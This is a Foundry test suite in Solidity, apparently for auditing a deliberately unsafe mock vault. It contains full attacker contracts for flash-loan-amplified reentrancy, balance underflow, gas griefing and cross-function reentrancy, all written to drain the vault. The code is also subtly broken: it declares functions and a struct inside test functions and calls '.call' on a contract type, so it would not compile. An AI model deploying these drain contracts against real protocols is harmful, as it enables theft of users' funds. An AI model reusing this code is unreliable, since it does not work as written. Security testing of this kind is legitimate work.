// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {UnsafeVault, ReentrancyAttacker} from "../Vault.sol";

/**
 * @title AdvancedVaultSecurityTest
 * @author Security Research Team
 * @notice Advanced security test suite for comprehensive vulnerability analysis
 * This extends the basic audit tests with sophisticated attack scenarios including:
 * - Flash loan amplified attacks
 * - Multi-vector exploit combinations
 * - Gas-based denial of service
 * - Economic rationality analysis
 * - Invariant violation detection
 */
contract AdvancedVaultSecurityTest is Test {
    UnsafeVault public vault;
    FlashLoanProvider public flashProvider;
    
    address public user1 = address(1);
    address public user2 = address(2);
    address public user3 = address(3);
    address public attacker = address(0x1337);
    
    // Test constants
    uint256 constant USER1_DEPOSIT = 10 ether;
    uint256 constant USER2_DEPOSIT = 5 ether;
    uint256 constant USER3_DEPOSIT = 20 ether;
    uint256 constant FLASH_LOAN_AMOUNT = 1000 ether;
    uint256 constant ATTACK_AMOUNT = 1 ether;

    function setUp() public {
        // Deploy contracts
        vault = new UnsafeVault();
        flashProvider = new FlashLoanProvider();
        
        // Fund users
        vm.deal(user1, 50 ether);
        vm.deal(user2, 30 ether);
        vm.deal(user3, 100 ether);
        vm.deal(attacker, 10 ether);
        
        // Fund flash loan provider
        vm.deal(address(flashProvider), 10000 ether);
        
        // Setup initial vault state with legitimate user funds
        vm.prank(user1);
        vault.deposit{value: USER1_DEPOSIT}();
        
        vm.prank(user2);
        vault.deposit{value: USER2_DEPOSIT}();
        
        vm.prank(user3);
        vault.deposit{value: USER3_DEPOSIT}();
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 1: ADVANCED ATTACK VECTORS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice CRITICAL TEST: Flash Loan Reentrancy Amplification
     * Tests how flash loans can amplify reentrancy attacks beyond normal capital constraints
     * This is the most dangerous real-world attack pattern
     */
    function test_Audit_FlashLoanReentrancyAmplification() public {
        uint256 vaultBalanceBefore = vault.getBalance();
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("=== FLASH LOAN REENTRANCY AMPLIFICATION TEST ===");
        console.log("Initial vault balance:", vaultBalanceBefore);
        console.log("Initial attacker balance:", attackerBalanceBefore);
        
        // Deploy advanced attacker with flash loan capability
        FlashLoanReentrancyAttacker advancedAttacker = new FlashLoanReentrancyAttacker(
            address(vault),
            address(flashProvider)
        );
        
        // Fund the attacker with minimal initial capital
        vm.deal(address(advancedAttacker), ATTACK_AMOUNT);
        
        // Execute the amplified attack
        vm.startPrank(attacker);
        advancedAttacker.executeAmplifiedAttack(FLASH_LOAN_AMOUNT);
        vm.stopPrank();
        
        uint256 vaultBalanceAfter = vault.getBalance();
        uint256 attackerProfits = advancedAttacker.getBalance();
        
        console.log("Vault balance after attack:", vaultBalanceAfter);
        console.log("Attacker profits:", attackerProfits);
        console.log("Funds extracted:", vaultBalanceBefore - vaultBalanceAfter);
        
        // Assertions: Attack should drain vault completely
        assertEq(vaultBalanceAfter, 0, "Vault should be completely drained");
        assertTrue(attackerProfits > vaultBalanceBefore, "Attacker should profit from amplification");
        
        // Economic analysis
        uint256 attackCost = ATTACK_AMOUNT; // Initial investment
        uint256 attackProfit = attackerProfits - attackCost;
        uint256 profitMultiplier = attackProfit / attackCost;
        
        console.log("Attack cost:", attackCost);
        console.log("Attack profit:", attackProfit);
        console.log("Profit multiplier:", profitMultiplier);
        
        assertTrue(profitMultiplier >= 30, "Attack should be highly profitable (30x+ returns)");
    }

    /**
     * @notice CRITICAL TEST: Multi-Vector Sequential Attack
     * Tests combination of multiple vulnerabilities in sequence for maximum damage
     */
    function test_Audit_MultiVectorSequentialAttack() public {
        console.log("=== MULTI-VECTOR SEQUENTIAL ATTACK TEST ===");
        
        MultiVectorAttacker multiAttacker = new MultiVectorAttacker(address(vault));
        vm.deal(address(multiAttacker), 2 ether);
        
        uint256 vaultBalanceBefore = vault.getBalance();
        console.log("Initial vault balance:", vaultBalanceBefore);
        
        // Execute combined attack sequence
        vm.startPrank(attacker);
        
        // Phase 1: Setup with small deposit to establish legitimacy
        multiAttacker.setupAttack{value: 1 ether}();
        
        // Phase 2: Execute underflow exploit to create phantom balance
        multiAttacker.executeUnderflowExploit();
        
        // Phase 3: Use phantom balance for massive reentrancy attack
        multiAttacker.executeAmplifiedReentrancy();
        
        // Phase 4: Exploit unchecked calls for remaining funds
        multiAttacker.executeUncheckedCallExploit();
        
        vm.stopPrank();
        
        uint256 vaultBalanceAfter = vault.getBalance();
        uint256 attackerProfits = multiAttacker.getBalance();
        
        console.log("Vault balance after multi-vector attack:", vaultBalanceAfter);
        console.log("Attacker total profits:", attackerProfits);
        
        // The combination should be more devastating than individual attacks
        assertEq(vaultBalanceAfter, 0, "Multi-vector attack should drain vault completely");
        assertTrue(attackerProfits > vaultBalanceBefore, "Multi-vector attack should be profitable");
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 2: GAS WARFARE ATTACKS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice HIGH PRIORITY: Gas Limit Denial of Service
     * Tests attacks that make the contract unusable through gas manipulation
     */
    function test_Audit_GasLimitDoS() public {
        console.log("=== GAS LIMIT DENIAL OF SERVICE TEST ===");
        
        GasAttacker gasAttacker = new GasAttacker(address(vault));
        vm.deal(address(gasAttacker), 5 ether);
        
        // Deposit funds to enable withdrawal
        vm.prank(address(gasAttacker));
        vault.deposit{value: 1 ether}();
        
        // Attempt withdrawal that consumes excessive gas
        vm.startPrank(address(gasAttacker));
        
        // This should fail due to gas exhaustion
        vm.expectRevert();
        gasAttacker.gasExhaustionAttack{gas: 200000}(); // Limit gas to test DoS
        
        vm.stopPrank();
        
        // Verify the contract is still functional for normal users
        vm.startPrank(user1);
        
        uint256 user1BalanceBefore = vault.balances(user1);
        vault.withdraw(1 ether);
        uint256 user1BalanceAfter = vault.balances(user1);
        
        vm.stopPrank();
        
        assertEq(user1BalanceAfter, user1BalanceBefore - 1 ether, "Normal users should still be able to withdraw");
        
        console.log("Gas DoS test completed - contract remains functional for normal users");
    }

    /**
     * @notice HIGH PRIORITY: Gas Griefing Attack
     * Tests attacks where recipient contracts waste gas to grief other users
     */
    function test_Audit_GasGriefingAttack() public {
        console.log("=== GAS GRIEFING ATTACK TEST ===");
        
        GasGriefingAttacker griefAttacker = new GasGriefingAttacker(address(vault));
        vm.deal(address(griefAttacker), 2 ether);
        
        // Deposit funds
        vm.prank(address(griefAttacker));
        vault.deposit{value: 1 ether}();
        
        // Measure gas cost of normal withdrawal
        vm.startPrank(user1);
        uint256 gasStart = gasleft();
        vault.withdraw(1 ether);
        uint256 normalGasCost = gasStart - gasleft();
        vm.stopPrank();
        
        // Execute griefing attack
        vm.startPrank(address(griefAttacker));
        gasStart = gasleft();
        griefAttacker.griefingWithdraw();
        uint256 griefingGasCost = gasStart - gasleft();
        vm.stopPrank();
        
        console.log("Normal withdrawal gas cost:", normalGasCost);
        console.log("Griefing withdrawal gas cost:", griefingGasCost);
        
        // Griefing attack should consume significantly more gas
        assertTrue(griefingGasCost > normalGasCost * 10, "Griefing attack should consume 10x more gas");
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 3: INVARIANT TESTING
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice CRITICAL: Invariant Violation Detection
     * Tests fundamental contract properties that should never be violated
     */
    function test_Audit_InvariantViolations() public {
        console.log("=== INVARIANT VIOLATION TESTING ===");
        
        // Invariant 1: Contract ETH balance >= Sum of user balances
        function checkBalanceInvariant() internal view returns (bool) {
            uint256 contractBalance = vault.getBalance();
            uint256 totalUserBalance = vault.totalVaultBalance();
            return contractBalance >= totalUserBalance;
        }
        
        // Invariant 2: Individual user balance <= Total deposits by that user
        function checkUserBalanceInvariant(address user) internal view returns (bool) {
            return vault.balances(user) <= type(uint256).max; // No overflow
        }
        
        // Test invariants before attack
        assertTrue(checkBalanceInvariant(), "Balance invariant should hold initially");
        assertTrue(checkUserBalanceInvariant(user1), "User balance invariant should hold initially");
        
        // Execute reentrancy attack and check invariants
        ReentrancyAttacker basicAttacker = new ReentrancyAttacker(address(vault));
        vm.deal(address(basicAttacker), 1 ether);
        basicAttacker.depositToVault(1 ether);
        basicAttacker.attack();
        
        // Check if invariants are violated
        bool balanceInvariantAfterAttack = checkBalanceInvariant();
        bool userBalanceInvariantAfterAttack = checkUserBalanceInvariant(address(basicAttacker));
        
        console.log("Balance invariant after attack:", balanceInvariantAfterAttack);
        console.log("User balance invariant after attack:", userBalanceInvariantAfterAttack);
        
        // These should be violated, proving the vulnerabilities
        assertFalse(balanceInvariantAfterAttack, "Balance invariant should be violated by reentrancy");
        
        // Test underflow invariant violation
        vm.startPrank(user2);
        vault.withdraw(USER2_DEPOSIT);
        vault.withdraw(USER2_DEPOSIT); // This should trigger underflow
        vm.stopPrank();
        
        bool underflowInvariant = vault.balances(user2) <= USER2_DEPOSIT;
        assertFalse(underflowInvariant, "Underflow should violate user balance invariant");
        
        console.log("User2 balance after underflow:", vault.balances(user2));
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 4: ECONOMIC ANALYSIS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice MEDIUM PRIORITY: Economic Rationality Testing
     * Tests whether attacks are economically rational for real attackers
     */
    function test_Audit_EconomicRationalityAnalysis() public {
        console.log("=== ECONOMIC RATIONALITY ANALYSIS ===");
        
        struct AttackAnalysis {
            uint256 initialCost;
            uint256 gasCapitalCost;
            uint256 opportunityCost;
            uint256 totalProfit;
            uint256 netProfit;
            uint256 roi; // Return on Investment %
            bool isRational;
        }
        
        AttackAnalysis memory analysis;
        
        // Simulate realistic gas prices and ETH values
        uint256 gasPrice = 20 gwei;
        uint256 ethPrice = 2000; // USD
        
        // Test basic reentrancy attack economics
        ReentrancyAttacker econAttacker = new ReentrancyAttacker(address(vault));
        analysis.initialCost = 1 ether; // Initial deposit needed
        
        vm.deal(address(econAttacker), analysis.initialCost);
        
        uint256 gasStart = gasleft();
        econAttacker.depositToVault(analysis.initialCost);
        econAttacker.attack();
        uint256 gasUsed = gasStart - gasleft();
        
        analysis.gasCapitalCost = gasUsed * gasPrice;
        analysis.totalProfit = econAttacker.getBalance();
        analysis.netProfit = analysis.totalProfit - analysis.initialCost - analysis.gasCapitalCost;
        analysis.roi = (analysis.netProfit * 100) / analysis.initialCost;
        analysis.isRational = analysis.netProfit > 0;
        
        console.log("Attack Economics Analysis:");
        console.log("Initial capital required:", analysis.initialCost);
        console.log("Gas cost:", analysis.gasCapitalCost);
        console.log("Total profit:", analysis.totalProfit);
        console.log("Net profit:", analysis.netProfit);
        console.log("ROI percentage:", analysis.roi);
        console.log("Economically rational:", analysis.isRational);
        
        assertTrue(analysis.isRational, "Attack should be economically rational");
        assertTrue(analysis.roi > 1000, "Attack should provide > 1000% ROI");
    }

    /*//////////////////////////////////////////////////////////////
                        PHASE 5: DEFENSE VALIDATION
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice MEDIUM PRIORITY: Test potential defenses and their bypass methods
     */
    function test_Audit_DefenseBypassAttempts() public {
        console.log("=== DEFENSE BYPASS TESTING ===");
        
        // Deploy a "safer" vault with basic reentrancy guard
        GuardedVault guardedVault = new GuardedVault();
        vm.deal(address(guardedVault), 100 ether);
        
        // Try to bypass reentrancy guard through cross-function reentrancy
        CrossFunctionAttacker crossAttacker = new CrossFunctionAttacker(address(guardedVault));
        vm.deal(address(crossAttacker), 2 ether);
        
        vm.startPrank(address(crossAttacker));
        
        // This should fail if guards are properly implemented
        vm.expectRevert();
        crossAttacker.attemptCrossFunctionBypass();
        
        vm.stopPrank();
        
        console.log("Cross-function reentrancy bypass test completed");
    }
}

/*//////////////////////////////////////////////////////////////
                        ATTACK CONTRACTS
//////////////////////////////////////////////////////////////*/

/**
 * @title FlashLoanProvider
 * @notice Mock flash loan provider for testing amplified attacks
 */
contract FlashLoanProvider {
    function flashLoan(address borrower, uint256 amount, bytes calldata data) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Insufficient liquidity");
        
        // Send funds to borrower
        (bool success,) = borrower.call{value: amount}("");
        require(success, "Transfer failed");
        
        // Execute borrower's logic
        IFlashLoanReceiver(borrower).onFlashLoan(amount, data);
        
        // Ensure repayment (simplified - no fees for testing)
        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
    }
    
    receive() external payable {}
}

interface IFlashLoanReceiver {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

/**
 * @title FlashLoanReentrancyAttacker
 * @notice Advanced attacker that uses flash loans to amplify reentrancy attacks
 */
contract FlashLoanReentrancyAttacker is IFlashLoanReceiver {
    UnsafeVault public vault;
    FlashLoanProvider public flashProvider;
    uint256 public attackAmount;
    bool public attacking;
    
    constructor(address _vault, address _flashProvider) {
        vault = UnsafeVault(_vault);
        flashProvider = FlashLoanProvider(_flashProvider);
    }
    
    function executeAmplifiedAttack(uint256 flashAmount) external payable {
        attackAmount = 1 ether; // Small amount to trigger reentrancy
        
        // Deposit minimal funds to establish legitimate balance
        vault.deposit{value: attackAmount}();
        
        // Initiate flash loan for amplification
        flashProvider.flashLoan(address(this), flashAmount, "");
    }
    
    function onFlashLoan(uint256 amount, bytes calldata) external override {
        require(msg.sender == address(flashProvider), "Unauthorized");
        
        // Use flash loan capital to amplify the attack
        // Deposit flash loan funds to increase vault balance
        vault.deposit{value: amount}();
        
        // Start reentrancy attack
        attacking = true;
        vault.withdraw(attackAmount);
        
        // Withdraw flash loan deposit to repay
        vault.withdraw(amount);
        
        // Repay flash loan
        flashProvider.call{value: amount}("");
    }
    
    receive() external payable {
        if (attacking && address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title MultiVectorAttacker
 * @notice Combines multiple attack vectors for maximum damage
 */
contract MultiVectorAttacker {
    UnsafeVault public vault;
    uint256 public phase;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function setupAttack() external payable {
        vault.deposit{value: msg.value}();
    }
    
    function executeUnderflowExploit() external {
        uint256 balance = vault.balances(address(this));
        vault.withdraw(balance);
        vault.withdraw(balance); // Trigger underflow
        phase = 1;
    }
    
    function executeAmplifiedReentrancy() external {
        if (phase == 1) {
            vault.withdraw(1 ether); // Use phantom balance from underflow
            phase = 2;
        }
    }
    
    function executeUncheckedCallExploit() external {
        // Final phase: exploit any remaining unchecked call vulnerabilities
        if (phase == 2 && address(vault).balance > 0) {
            vault.withdraw(address(vault).balance);
        }
    }
    
    receive() external payable {
        if (phase == 2 && address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title GasAttacker
 * @notice Tests gas-based denial of service attacks
 */
contract GasAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function gasExhaustionAttack() external {
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        // Consume excessive gas
        uint256 iterations = 10000;
        uint256 dummy;
        for (uint256 i = 0; i < iterations; i++) {
            dummy += i * block.timestamp;
        }
    }
}

/**
 * @title GasGriefingAttacker
 * @notice Tests gas griefing through expensive receive function
 */
contract GasGriefingAttacker {
    UnsafeVault public vault;
    mapping(uint256 => uint256) public expensiveStorage;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function griefingWithdraw() external {
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        // Extremely expensive operations to grief gas
        for (uint256 i = 0; i < 1000; i++) {
            expensiveStorage[i] = block.timestamp + i;
        }
    }
}

/**
 * @title GuardedVault  
 * @notice Example of vault with basic reentrancy protection
 */
contract GuardedVault {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    receive() external payable {}
}

/**
 * @title CrossFunctionAttacker
 * @notice Tests cross-function reentrancy bypass attempts
 */
contract CrossFunctionAttacker {
    GuardedVault public vault;
    
    constructor(address _vault) {
        vault = GuardedVault(_vault);
    }
    
    function attemptCrossFunctionBypass() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
    
    receive() external payable {
        // Try to call different function during reentrancy
        if (address(vault).balance > 0) {
            vault.deposit{value: 0.1 ether}();
        }
    }
}